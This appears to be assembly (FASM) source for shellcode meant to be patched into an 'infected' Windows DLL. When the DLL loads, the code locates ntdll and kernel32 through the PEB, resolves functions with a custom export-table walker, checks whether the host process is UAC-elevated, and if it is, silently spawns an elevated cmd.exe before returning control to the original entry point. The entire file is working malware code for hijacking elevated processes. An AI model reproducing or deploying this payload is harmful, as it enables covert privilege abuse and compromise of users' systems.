;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Shellcode will use functions from ntdll/kernel32 to check if process
;is UAC elevated and if so spawn elevated cmd.exe. Once complete
;control is passed back to the infected DLL so the application will
;contine to run normally.
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
use32
include 'win32ax.inc'

TOKEN_QUERY		equ 0x08
TokenElevationType	equ 0x12
DLL_PROCESS_ATTACH	equ 0x01

	;Only run on dll load
	cmp dword [esp+0x08], DLL_PROCESS_ATTACH
	jnz ReturnToEntry

	pushad
	call RunCMD
	popad

ReturnToEntry:
	jmp 0xDEADBEEF	;Will be modified to jump to original entry point

proc RunCMD
locals
	TokenHandle	   dd 0
	ElevationLevel	   dd ?
	ReturnSize	   dd ?
	Ntdll		   dd ?
	Kernel32	   dd ?
	OpenProcToken	   dd ?
	QueryToken	   dd ?
	NtClose 	   dd ?
	ExpandEnvStrs	   dd ?
	CreateProcess	   dd ?
	OpenProcTokenName  db 'NtOpenProcessToken', 0
	QueryTokenName	   db 'NtQueryInformationToken', 0
	NtCloseName	   db 'NtClose', 0
	ExpandEnvStrsName  db 'ExpandEnvironmentStringsA', 0
	CreateProcessName  db 'CreateProcessA', 0
	StartupInfo	   db 68 dup(0)
	ProcessInfo	   PROCESS_INFORMATION
	FilePath	   db '%windir%\system32\cmd.exe', 0
	ExpandedFilePath   db 256 dup(?)

endl
	mov eax, [fs:0x30]	;Process Environment Block
	mov eax, [eax+0x0C]	;PEB->Ldr
	mov eax, [eax+0x14]	;PEB->Ldr.InLoadOrderModuleList

	mov eax, [eax]		;First Module (ntdll.dll)
	mov edx, [eax+0x10]	;BaseAddress
	mov [Ntdll], edx

	mov eax, [eax]		;Second Module (kernel32.dll)
	mov edx, [eax+0x10]	;BaseAddress
	mov [Kernel32], edx

	stdcall GetProcAddress, [Ntdll], addr OpenProcTokenName
	mov [OpenProcToken], eax

	stdcall GetProcAddress, [Ntdll], addr QueryTokenName
	mov [QueryToken], eax

	stdcall GetProcAddress, [Ntdll], addr NtCloseName
	mov [NtClose], eax

	stdcall GetProcAddress, [Kernel32], addr ExpandEnvStrsName
	mov [ExpandEnvStrs], eax

	stdcall GetProcAddress, [Kernel32], addr CreateProcessName
	mov [CreateProcess], eax

	stdcall [OpenProcToken], -1, TOKEN_QUERY, addr TokenHandle

	test eax, eax
	jnz failed

	;ElevationLevel will be 3 for non-elevated and 2 for elevated
	stdcall [QueryToken], [TokenHandle], TokenElevationType, addr ElevationLevel, 4, addr ReturnSize

	test eax, eax
	jnz failed

	;If ElevationLevel is not 2, then we were run from a non UAC elevated process
	cmp [ElevationLevel], 2
	jnz failed

	stdcall [ExpandEnvStrs], addr FilePath, addr ExpandedFilePath, 255

	stdcall [CreateProcess], 0, addr ExpandedFilePath, 0, 0, 0, 0, 0, 0, addr StartupInfo, addr ProcessInfo

failed:
	cmp [TokenHandle], 0
	jz  exit

	stdcall [NtClose], [TokenHandle]

exit:
	mov esp, ebp
	pop ebp
	retn
endp

;Simple GetProcAddress implementation without import forwarding
proc GetProcAddress Module, Name
locals
	AddressOfFunctions	dd ?
	AddressOfNames		dd ?
	AddressOfNameOrdinals	dd ?
endl
	
	mov eax, [Module]
	mov ecx, [eax+0x3C]		;IMAGE_DOS_HEADER.e_lfanew
	add ecx, eax			;IMAGE_NT_HEADERS

	cmp dword [ecx], 0x4550 	;IMAGE_NT_HEADERS.Signature
	jne GPAFailed

	lea edx, dword [ecx+0x78]	;IMAGE_NT_HEADERS.OptionalHeader.DataDirectory
	mov edx, dword [edx]		;IMAGE_DATA_DIRECTORY.VirtualAddress
	add edx, eax			;Calculate absolute address (Base+VirtualAddress)

	mov ecx, dword [edx+0x1C]	;IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
	add ecx, eax			;Calculate absolute address (Base+AddressOfFunctions)
	mov [AddressOfFunctions], ecx

	mov ecx, dword [edx+0x20]	;IMAGE_EXPORT_DIRECTORY.AddressOfNames
	add ecx, eax			;Calculate absolute address (Base+AddressOfNames)
	mov [AddressOfNames], ecx

	mov ecx, dword [edx+0x24]	;IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
	add ecx, eax			;Calculate absolute address (Base+AddressOfNameOrdinals)
	mov [AddressOfNameOrdinals], ecx

	xor ecx, ecx			;FunctionNumber

NextExport:
	mov ebx, [AddressOfNames]
	mov ebx, [4*ecx+ebx]		;AddressOfNames[FunctionNumber]
	add ebx, eax			;Absolute address of function name

	push eax

	push ebx
	push dword [Name]
	call strcmp
	test eax, eax

	pop eax 				
	je GPASuccess			;These are the offsets we're looking for

	inc ecx 			;FunctionNumber++
	cmp ecx, [edx+0x18]		;IMAGE_EXPORT_DIRECTORY.NumberOfNames (Is this the last func?)
	jne NextExport
	jmp GPAFailed

GPASuccess:
	mov edx, [AddressOfNameOrdinals]
	movzx ebx, word [2*ecx+edx]	;Ordinal[FunctionNumber]
	mov ecx, [AddressOfFunctions]
	mov ebx, dword [4*ebx+ecx]	;AddressOfFunctions[Ordinal[FunctionNumber]]
	add eax, ebx			;Absolute address of function
	
	jmp GPAFinished 			

GPAFailed:
	xor eax, eax
	
GPAFinished:
	mov esp, ebp
	pop ebp
	ret 0x08
endp

proc strcmp String1, String2
	push esi
	push edi
	push ecx
	
	mov esi, [String1]
	mov edi, [String2]
	xor ecx, ecx

StrcmpLoop:
	mov al, byte [edi+ecx]
	mov ah, byte [esi+ecx]
	and al,0xDF			;Case insensitive
	and ah,0xDF
	cmp al, ah
	jne StrcmpNotEqual

	cmp al, 0
	je StrcmpIsEqual

	inc ecx
	jmp StrcmpLoop

StrcmpIsEqual:
	xor eax, eax
	jmp StrcmpEnd

StrcmpNotEqual:
	mov eax, 1
	
StrcmpEnd:
	pop ecx
	pop edi
	pop esi
	
	mov esp, ebp
	pop ebp
	ret 0x08
endp
